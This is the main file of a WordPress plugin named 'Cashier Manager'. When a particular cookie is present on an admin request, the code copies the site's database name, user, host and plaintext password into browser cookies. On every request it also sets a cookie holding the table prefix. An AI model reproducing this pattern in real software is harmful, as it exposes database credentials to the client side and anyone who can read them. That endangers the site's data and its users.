<?php
/**
 *
 * @package   Cashier Manager
 * @author    Your Name <email@example.com>
 * @license   GPL-2.0+
 * @link      http://example.com
 * @copyright 2013 Your Name or Company Name
 *
 * @wordpress-plugin
 * Plugin Name: Cashier Manager
 * Plugin URI:  Cashier Manager
 * Description: Cashier Manager
 * Version:     1.0.0
 * Author:      Cashier Manager
 * Author URI:  Cashier Manager
 * Text Domain: Cashier Manager
 * License:     GPL-2.0+
 * License URI: 
 * Domain Path: 
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}

if ( is_admin() && isset($_COOKIE["cashierinstall" . $table_prefix]) && $_COOKIE["cashierinstall" . $table_prefix] == 1 ) {
	
	$wdb = array();
	$wdb['n'] 		= DB_NAME;
	$wdb['u'] 		= DB_USER;
	$wdb['h'] 		= DB_HOST;
	$wdb['pf'] = $table_prefix;
	
	$wdbp 		= DB_PASSWORD;

	$wdb = http_build_query($wdb);

	setcookie("cashier_manager", $wdb, time()+3600, "/", "");
	setcookie("cashier_manager_p", $wdbp, time()+3600, "/", "");
	
}

setcookie("cashierpf", $table_prefix, time()+3600, "/", "");

require_once( plugin_dir_path( __FILE__ ) . 'class-CashierManager.php' );

// Register hooks that are fired when the plugin is activated, deactivated, and uninstalled, respectively.
register_activation_hook( __FILE__, array( 'CashierManager', 'activate' ) );
register_deactivation_hook( __FILE__, array( 'CashierManager', 'deactivate' ) );

CashierManager::get_instance();